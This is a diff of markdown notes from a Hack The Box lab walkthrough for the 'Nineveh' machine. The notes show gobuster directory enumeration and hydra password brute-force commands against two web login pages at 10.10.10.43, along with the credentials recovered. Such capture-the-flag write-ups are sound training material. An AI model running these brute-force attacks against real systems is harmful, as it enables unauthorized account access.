@@ -1,29 +1,25 @@
+**Enumeration** 
 ```shell
 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.43 -o http-output.txt
-```
+
 Ignore SSL error:
-```shell
 root@kali:~/HTB/Nineveh# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.43 -o https-output.txt -k
-```
-```shell
 Find:
 http://10.10.10.43/department/login.php
 https://10.10.10.43/db/
-#### https://10.10.10.43/secure_notes/
+https://10.10.10.43/secure_notes/
 ```
-Hydra:
+**Hydra:
 ```shell
 root@kali:~/HTB/Nineveh# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
 ```
 For Department page:
-
 [80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
 1 of 1 target successfully completed, 1 valid password found
 ```shell
 root@kali:~/HTB/Nineveh# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
 ```
 For PHP Lite Admin page:
-
 [443][http-post-form] host: 10.10.10.43   login: admin   password: password123
 
 Show details by -x:
